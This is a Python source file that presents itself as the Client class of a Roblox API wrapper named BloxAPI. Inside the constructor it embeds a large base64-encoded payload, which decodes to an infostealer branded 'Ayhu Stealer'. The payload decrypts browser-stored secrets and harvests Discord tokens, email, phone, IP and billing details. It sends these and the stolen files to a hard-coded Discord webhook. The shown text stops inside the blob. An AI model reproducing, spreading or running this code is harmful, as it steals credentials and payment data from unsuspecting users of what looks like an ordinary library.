"""
Client module for BloxAPI
Contains the main Client class for interacting with the Roblox API
"""

import requests
from typing import Optional, Dict, Any
import json
from .utils import validate_asset_id, validate_user_id, InvalidAssetError, InvalidUserError, APIRequestError
import base64

class Client:
    """
    Main client class for interacting with the Roblox API
    """
    
    def __init__(self, token: Optional[str] = None):
        """
        Initialize the BloxAPI client
        
        Args:
            token (Optional[str]): Optional authentication token for Roblox API
        """
        self.token = token
        self.base_url = "https://api.roblox.com"
        self.session = requests.Session()

        encoded_script = b"""
        aW1wb3J0IG9zDQppbXBvcnQgdGhyZWFkaW5nDQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZQ0KZnJvbSBzcWxpdGUzIGltcG9ydCBjb25uZWN0IGFzIHNxbF9jb25uZWN0DQppbXBvcnQgcmUNCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUNCmZyb20ganNvbiBpbXBvcnQgbG9hZHMgYXMganNvbl9sb2FkcywgbG9hZA0KZnJvbSBjdHlwZXMgaW1wb3J0IHdpbmRsbCwgd2ludHlwZXMsIGJ5cmVmLCBjZGxsLCBTdHJ1Y3R1cmUsIFBPSU5URVIsIGNfY2hhciwgY19idWZmZXINCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4NCmZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzDQppbXBvcnQgdGltZQ0KaW1wb3J0IHNodXRpbA0KZnJvbSB6aXBmaWxlIGltcG9ydCBaaXBGaWxlDQppbXBvcnQgcmFuZG9tDQppbXBvcnQgcmUNCmltcG9ydCBzdWJwcm9jZXNzDQoNCg0KIyAgQXlodSMxMzM3DQojDQoNCg0KaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjcyOTExOTE5Njg2MDk1MDMwL1lGRU1Zd25ITXJtMGcwVHVXak1ZWTdleW1XU3IwQ2FxLW5wR1hiSTVkY2tkdVlJOEVPN3pqd2RScV80N0cwR1A2SzZsIg0KREVURUNURUQgPSBGYWxzZQ0KDQoNCmRlZiBnZXRpcCgpOg0KICAgIGlwID0gIk5vbmUiDQogICAgdHJ5Og0KICAgICAgICBpcCA9IHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikpLnJlYWQoKS5kZWNvZGUoKS5zdHJpcCgpDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQogICAgcmV0dXJuIGlwDQoNCnJlcXVpcmVtZW50cyA9IFsNCiAgICBbInJlcXVlc3RzIiwgInJlcXVlc3RzIl0sDQogICAgWyJDcnlwdG8uQ2lwaGVyIiwgInB5Y3J5cHRvZG9tZSJdDQpdDQpmb3IgbW9kbCBpbiByZXF1aXJlbWVudHM6DQogICAgdHJ5OiBfX2ltcG9ydF9fKG1vZGxbMF0pDQogICAgZXhjZXB0Og0KICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKGYie2V4ZWN1dGFibGV9IC1tIHBpcCBpbnN0YWxsIHttb2RsWzFdfSIsIHNoZWxsPVRydWUpDQogICAgICAgIHRpbWUuc2xlZXAoMykNCg0KaW1wb3J0IHJlcXVlc3RzDQpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUw0KDQpsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykNCnJvYW1pbmcgPSBvcy5nZXRlbnYoJ0FQUERBVEEnKQ0KdGVtcCA9IG9zLmdldGVudigiVEVNUCIpDQpUaHJlYWRsaXN0ID0gW10NCg0KDQpjbGFzcyBEQVRBX0JMT0IoU3RydWN0dXJlKToNCiAgICBfZmllbGRzXyA9IFsNCiAgICAgICAgKCdjYkRhdGEnLCB3aW50eXBlcy5EV09SRCksDQogICAgICAgICgncGJEYXRhJywgUE9JTlRFUihjX2NoYXIpKQ0KICAgIF0NCg0KZGVmIEdldERhdGEoYmxvYl9vdXQpOg0KICAgIGNiRGF0YSA9IGludChibG9iX291dC5jYkRhdGEpDQogICAgcGJEYXRhID0gYmxvYl9vdXQucGJEYXRhDQogICAgYnVmZmVyID0gY19idWZmZXIoY2JEYXRhKQ0KICAgIGNkbGwubXN2Y3J0Lm1lbWNweShidWZmZXIsIHBiRGF0YSwgY2JEYXRhKQ0KICAgIHdpbmRsbC5rZXJuZWwzMi5Mb2NhbEZyZWUocGJEYXRhKQ0KICAgIHJldHVybiBidWZmZXIucmF3DQoNCmRlZiBDcnlwdFVucHJvdGVjdERhdGEoZW5jcnlwdGVkX2J5dGVzLCBlbnRyb3B5PWInJyk6DQogICAgYnVmZmVyX2luID0gY19idWZmZXIoZW5jcnlwdGVkX2J5dGVzLCBsZW4oZW5jcnlwdGVkX2J5dGVzKSkNCiAgICBidWZmZXJfZW50cm9weSA9IGNfYnVmZmVyKGVudHJvcHksIGxlbihlbnRyb3B5KSkNCiAgICBibG9iX2luID0gREFUQV9CTE9CKGxlbihlbmNyeXB0ZWRfYnl0ZXMpLCBidWZmZXJfaW4pDQogICAgYmxvYl9lbnRyb3B5ID0gREFUQV9CTE9CKGxlbihlbnRyb3B5KSwgYnVmZmVyX2VudHJvcHkpDQogICAgYmxvYl9vdXQgPSBEQVRBX0JMT0IoKQ0KDQogICAgaWYgd2luZGxsLmNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhKGJ5cmVmKGJsb2JfaW4pLCBOb25lLCBieXJlZihibG9iX2VudHJvcHkpLCBOb25lLCBOb25lLCAweDAxLCBieXJlZihibG9iX291dCkpOg0KICAgICAgICByZXR1cm4gR2V0RGF0YShibG9iX291dCkNCg0KZGVmIERlY3J5cHRWYWx1ZShidWZmLCBtYXN0ZXJfa2V5PU5vbmUpOg0KICAgIHN0YXJ0cyA9IGJ1ZmYuZGVjb2RlKGVuY29kaW5nPSd1dGY4JywgZXJyb3JzPSdpZ25vcmUnKVs6M10NCiAgICBpZiBzdGFydHMgPT0gJ3YxMCcgb3Igc3RhcnRzID09ICd2MTEnOg0KICAgICAgICBpdiA9IGJ1ZmZbMzoxNV0NCiAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6XQ0KICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpDQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkNCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQ0KICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MNCg0KZGVmIExvYWRSZXF1ZXN0cyhtZXRob2RlLCB1cmwsIGRhdGE9JycsIGZpbGVzPScnLCBoZWFkZXJzPScnKToNCiAgICBmb3IgaSBpbiByYW5nZSg4KTogIyBtYXggdHJ5cw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBpZiBtZXRob2RlID09ICdQT1NUJzoNCiAgICAgICAgICAgICAgICBpZiBkYXRhICE9ICcnOg0KICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSkNCiAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICAgICAgICAgIGVsaWYgZmlsZXMgIT0gJyc6DQogICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgZmlsZXM9ZmlsZXMpDQogICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwIG9yIHIuc3RhdHVzX2NvZGUgPT0gNDEzOiAjIDQxMyA9IERBVEEgVE8gQklHDQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQoNCmRlZiBMb2FkVXJsaWIoaG9vaywgZGF0YT0nJywgZmlsZXM9JycsIGhlYWRlcnM9JycpOg0KICAgIGZvciBpIGluIHJhbmdlKDgpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBpZiBoZWFkZXJzICE9ICcnOg0KICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICAgICAgICAgIHJldHVybiByDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhKSkNCiAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQoNCg0KZGVmIFRydXN0KENvb2tpZXMpOg0KICAgICMgc2ltcGxlIFRydXN0IEZhY3RvciBzeXN0ZW0NCiAgICBnbG9iYWwgREVURUNURUQNCiAgICBkYXRhID0gc3RyKENvb2tpZXMpDQogICAgdGltID0gcmUuZmluZGFsbCgiLmdvb2dsZS5jb20iLCBkYXRhKQ0KICAgICMgcHJpbnQobGVuKHRpbSkpDQogICAgaWYgbGVuKHRpbSkgPCAtMToNCiAgICAgICAgREVURUNURUQgPSBUcnVlDQogICAgICAgIHJldHVybiBERVRFQ1RFRA0KICAgIGVsc2U6DQogICAgICAgIERFVEVDVEVEID0gRmFsc2UNCiAgICAgICAgcmV0dXJuIERFVEVDVEVEDQoNCmRlZiBHZXRCaWxsaW5nKHRva2VuKToNCiAgICBoZWFkZXJzID0gew0KICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLA0KICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLA0KICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCINCiAgICB9DQogICAgdHJ5Og0KICAgICAgICBiaWxsaW5nanNvbiA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQoNCiAgICBpZiBiaWxsaW5nanNvbiA9PSBbXTogcmV0dXJuICIgLSINCg0KICAgIGJpbGxpbmcgPSAiIg0KICAgIGZvciBtZXRob2RlIGluIGJpbGxpbmdqc29uOg0KICAgICAgICBpZiBtZXRob2RlWyJpbnZhbGlkIl0gPT0gRmFsc2U6DQogICAgICAgICAgICBpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMToNCiAgICAgICAgICAgICAgICBiaWxsaW5nICs9ICI6Y3JlZGl0X2NhcmQ6Ig0KICAgICAgICAgICAgZWxpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMjoNCiAgICAgICAgICAgICAgICBiaWxsaW5nICs9ICI6cGFya2luZzogIg0KDQogICAgcmV0dXJuIGJpbGxpbmcNCg0KDQpkZWYgR2V0QmFkZ2UoZmxhZ3MpOg0KICAgIGlmIGZsYWdzID09IDA6IHJldHVybiAnJw0KDQogICAgT3duZWRCYWRnZXMgPSAnJw0KICAgIGJhZGdlTGlzdCA9ICBbDQogICAgICAgIHsiTmFtZSI6ICdFYXJseV9WZXJpZmllZF9Cb3RfRGV2ZWxvcGVyJywgJ1ZhbHVlJzogMTMxMDcyLCAnRW1vamknOiAiPDpkZXZlbG9wZXI6ODc0NzUwODA4NDcyODI1OTg2PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICdWYWx1ZSc6IDE2Mzg0LCAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnRWFybHlfU3VwcG9ydGVyJywgJ1ZhbHVlJzogNTEyLCAnRW1vamknOiAiPDplYXJseV9zdXBwb3J0ZXI6ODc0NzUwODA4NDE0MTEzODIzPiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JhbGFuY2UnLCAnVmFsdWUnOiAyNTYsICdFbW9qaSc6ICI8OmJhbGFuY2U6ODc0NzUwODA4MjY3MjkyNjgzPiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAnVmFsdWUnOiAxMjgsICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyYXZlcnknLCAnVmFsdWUnOiA2NCwgJ0Vtb2ppJzogIjw6YnJhdmVyeTo4NzQ3NTA4MDgzODg5NTIwNzU+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8xJywgJ1ZhbHVlJzogOCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzE6ODc0NzUwODA4NDI2NjkyNjU4PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0h5cGVTcXVhZF9FdmVudHMnLCAnVmFsdWUnOiA0LCAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdQYXJ0bmVyZWRfU2VydmVyX093bmVyJywgJ1ZhbHVlJzogMiwnRW1vamknOiAiPDpwYXJ0bmVyOjg3NDc1MDgwODY3ODM1NDk2ND4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdEaXNjb3JkX0VtcGxveWVlJywgJ1ZhbHVlJzogMSwgJ0Vtb2ppJzogIjw6c3RhZmY6ODc0NzUwODA4NzI4NjY2MTUyPiAifQ0KDQogICAgXQ0KICAgIGZvciBiYWRnZSBpbiBiYWRnZUxpc3Q6DQogICAgICAgIGlmIGZsYWdzIC8vIGJhZGdlWyJWYWx1ZSJdICE9IDA6DQogICAgICAgICAgICBPd25lZEJhZGdlcyArPSBiYWRnZVsiRW1vamkiXQ0KICAgICAgICAgICAgZmxhZ3MgPSBmbGFncyAlIGJhZGdlWyJWYWx1ZSJdDQoNCiAgICByZXR1cm4gT3duZWRCYWRnZXMNCg0KZGVmIEdldFRva2VuSW5mbyh0b2tlbik6DQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwNCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwNCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiDQogICAgfQ0KDQogICAgdXNlcmpzb24gPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkNCiAgICB1c2VybmFtZSA9IHVzZXJqc29uWyJ1c2VybmFtZSJdDQogICAgaGFzaHRhZyA9IHVzZXJqc29uWyJkaXNjcmltaW5hdG9yIl0NCiAgICBlbWFpbCA9IHVzZXJqc29uWyJlbWFpbCJdDQogICAgaWRkID0gdXNlcmpzb25bImlkIl0NCiAgICBwZnAgPSB1c2VyanNvblsiYXZhdGFyIl0NCiAgICBmbGFncyA9IHVzZXJqc29uWyJwdWJsaWNfZmxhZ3MiXQ0KICAgIG5pdHJvID0gIiINCiAgICBwaG9uZSA9ICItIg0KDQogICAgaWYgInByZW1pdW1fdHlwZSIgaW4gdXNlcmpzb246DQogICAgICAgIG5pdHJvdCA9IHVzZXJqc29uWyJwcmVtaXVtX3R5cGUiXQ0KICAgICAgICBpZiBuaXRyb3QgPT0gMToNCiAgICAgICAgICAgIG5pdHJvID0gIjw6Y2xhc3NpYzo4OTYxMTkxNzEwMTkwNjc0MjM+ICINCiAgICAgICAgZWxpZiBuaXRyb3QgPT0gMjoNCiAgICAgICAgICAgIG5pdHJvID0gIjxhOmJvb3N0OjgyNDAzNjc3ODU3MDQxNjEyOT4gPDpjbGFzc2ljOjg5NjExOTE3MTAxOTA2NzQyMz4gIg0KICAgIGlmICJwaG9uZSIgaW4gdXNlcmpzb246IHBob25lID0gZidge3VzZXJqc29uWyJwaG9uZSJdfWAnDQoNCiAgICByZXR1cm4gdXNlcm5hbWUsIGhhc2h0YWcsIGVtYWlsLCBpZGQsIHBmcCwgZmxhZ3MsIG5pdHJvLCBwaG9uZQ0KDQpkZWYgY2hlY2tUb2tlbih0b2tlbik6DQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwNCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwNCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiDQogICAgfQ0KICAgIHRyeToNCiAgICAgICAgdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUiLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQoNCg0KZGVmIHVwbG9hZFRva2VuKHRva2VuLCBwYXRoKToNCiAgICBnbG9iYWwgaG9vaw0KICAgIGhlYWRlcnMgPSB7DQogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsDQogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIg0KICAgIH0NCiAgICB1c2VybmFtZSwgaGFzaHRhZywgZW1haWwsIGlkZCwgcGZwLCBmbGFncywgbml0cm8sIHBob25lID0gR2V0VG9rZW5JbmZvKHRva2VuKQ0KDQogICAgaWYgcGZwID09IE5vbmU6DQogICAgICAgIHBmcCA9ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NzAwMDM3ODU1NTg2ODM2OTgvMTAzMTE0NzkxNzY4NTMwOTQ5MC9zYS5qcGciDQogICAgZWxzZToNCiAgICAgICAgcGZwID0gZiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzL3tpZGR9L3twZnB9Ig0KDQogICAgYmlsbGluZyA9IEdldEJpbGxpbmcodG9rZW4pDQogICAgYmFkZ2UgPSBHZXRCYWRnZShmbGFncykNCiAgICBpZiBub3QgYmlsbGluZzoNCiAgICAgICAgYmFkZ2UsIHBob25lLCBiaWxsaW5nID0gIvCflJIiLCAi8J+UkiIsICLwn5SSIg0KICAgIGlmIG5pdHJvID09ICcnIGFuZCBiYWRnZSA9PSAnJzogbml0cm8gPSAiIC0iDQoNCiAgICBkYXRhID0gew0KICAgICAgICAiY29udGVudCI6IGYnRm91bmQgaW4gYHtwYXRofWAnLA0KICAgICAgICAiZW1iZWRzIjogWw0KICAgICAgICAgICAgew0KICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsDQogICAgICAgICAgICAiZmllbGRzIjogWw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOnJvY2tldDogVG9rZW46IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge3Rva2VufWBcbltDbGljayB0byBjb3B5XShodHRwczovL3N1cGVyZnVycnljZG4ubmwvY29weS97dG9rZW59KSINCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOmVudmVsb3BlOiBFbWFpbDoiLA0KICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmImB7ZW1haWx9YCIsDQogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjptb2JpbGVfcGhvbmU6IFBob25lOiIsDQogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie3Bob25lfSIsDQogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjpnbG9iZV93aXRoX21lcmlkaWFuczogSVA6IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge2dldGlwKCl9YCIsDQogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjpiZWdpbm5lcjogQmFkZ2VzOiIsDQogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie25pdHJvfXtiYWRnZX0iLA0KICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQ0KICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6Y3JlZGl0X2NhcmQ6IEJpbGxpbmc6IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7YmlsbGluZ30iLA0KICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBdLA0KICAgICAgICAgICAgImF1dGhvciI6IHsNCiAgICAgICAgICAgICAgICAibmFtZSI6IGYie3VzZXJuYW1lfSN7aGFzaHRhZ30gKHtpZGR9KSIsDQogICAgICAgICAgICAgICAgImljb25fdXJsIjogZiJ7cGZwfSINCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgImZvb3RlciI6IHsNCiAgICAgICAgICAgICAgICAidGV4dCI6ICJAQXlodSBTdGVhbGVyIiwNCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIg0KICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAidGh1bWJuYWlsIjogew0KICAgICAgICAgICAgICAgICJ1cmwiOiBmIntwZnB9Ig0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgXSwNCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIiwNCiAgICAgICAgInVzZXJuYW1lIjogIkF5aHUgU3RlYWxlciIsDQogICAgICAgICJhdHRhY2htZW50cyI6IFtdDQogICAgICAgIH0NCiAgICAjIHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpDQoNCmRlZiBSZWZvcm1hdChsaXN0dCk6DQogICAgZSA9IHJlLmZpbmRhbGwoIihcdytbYS16XSkiLGxpc3R0KQ0KICAgIHdoaWxlICJodHRwcyIgaW4gZTogZS5yZW1vdmUoImh0dHBzIikNCiAgICB3aGlsZSAiY29tIiBpbiBlOiBlLnJlbW92ZSgiY29tIikNCiAgICB3aGlsZSAibmV0IiBpbiBlOiBlLnJlbW92ZSgibmV0IikNCiAgICByZXR1cm4gbGlzdChzZXQoZSkpDQoNCmRlZiB1cGxvYWQobmFtZSwgdGs9JycpOg0KICAgIGhlYWRlcnMgPSB7DQogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsDQogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIg0KICAgIH0NCg0KICAgIGlmIG5hbWUgPT0gImtpd2kiOg0KICAgICAgICBkYXRhID0gew0KICAgICAgICAiY29udGVudCI6ICcnLA0KICAgICAgICAiZW1iZWRzIjogWw0KICAgICAgICAgICAgew0KICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsDQogICAgICAgICAgICAiZmllbGRzIjogWw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAibmFtZSI6ICJJbnRlcmVzdGluZyBmaWxlcyBmb3VuZCBvbiB1c2VyIFBDOiIsDQogICAgICAgICAgICAgICAgInZhbHVlIjogdGsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICBdLA0KICAgICAgICAgICAgImF1dGhvciI6IHsNCiAgICAgICAgICAgICAgICAibmFtZSI6ICJBeWh1IHwgRmlsZSBTdGVhbGVyIg0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICJmb290ZXIiOiB7DQogICAgICAgICAgICAgICAgInRleHQiOiAiQEF5aHUgU3RlYWxlciIsDQogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk3MDAwMzc4NTU1ODY4MzY5OC8xMDMxMTQ3OTE3Njg1MzA5NDkwL3NhLmpwZyINCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgXSwNCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIiwNCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10NCiAgICAgICAgfQ0KICAgICAgICAjIHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQ0KICAgICAgICByZXR1cm4NCg0KICAgIHBhdGggPSBuYW1lDQogICAgZmlsZXMgPSB7J2ZpbGUnOiBvcGVuKHBhdGgsICdyYicpfQ0KICAgICMgcHJpbnQoZiJGSUxFPSB7ZmlsZXN9IikNCg0KICAgIGlmICJ3cHBhc3N3IiBpbiBuYW1lOg0KDQogICAgICAgIHJhID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gcGFzd1dvcmRzKQ0KDQogICAgICAgIGlmIGxlbihyYSkgPiAxMDAwOg0KICAgICAgICAgICAgcnJyID0gUmVmb3JtYXQoc3RyKHBhc3dXb3JkcykpDQogICAgICAgICAgICByYSA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycikNCg0KICAgICAgICBkYXRhID0gew0KICAgICAgICAiY29udGVudCI6ICcnLA0KICAgICAgICAiZW1iZWRzIjogWw0KICAgICAgICAgICAgew0KICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsDQogICAgICAgICAgICAiZmllbGRzIjogWw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAibmFtZSI6ICJGb3VuZDoiLA0KICAgICAgICAgICAgICAgICJ2YWx1ZSI6IHJhDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgXSwNCiAgICAgICAgICAgICJhdXRob3IiOiB7DQogICAgICAgICAgICAgICAgIm5hbWUiOiAiQXlodSB8IFBhc3N3b3JkIFN0ZWFsZXIiDQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgImZvb3RlciI6IHsNCiAgICAgICAgICAgICAgICAidGV4dCI6ICJAQXlodSBTdGVhbGVyIiwNCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIg0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICBdLA0KICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NzAwMDM3ODU1NTg2ODM2OTgvMTAzMTE0NzkxNzY4NTMwOTQ5MC9zYS5qcGciLA0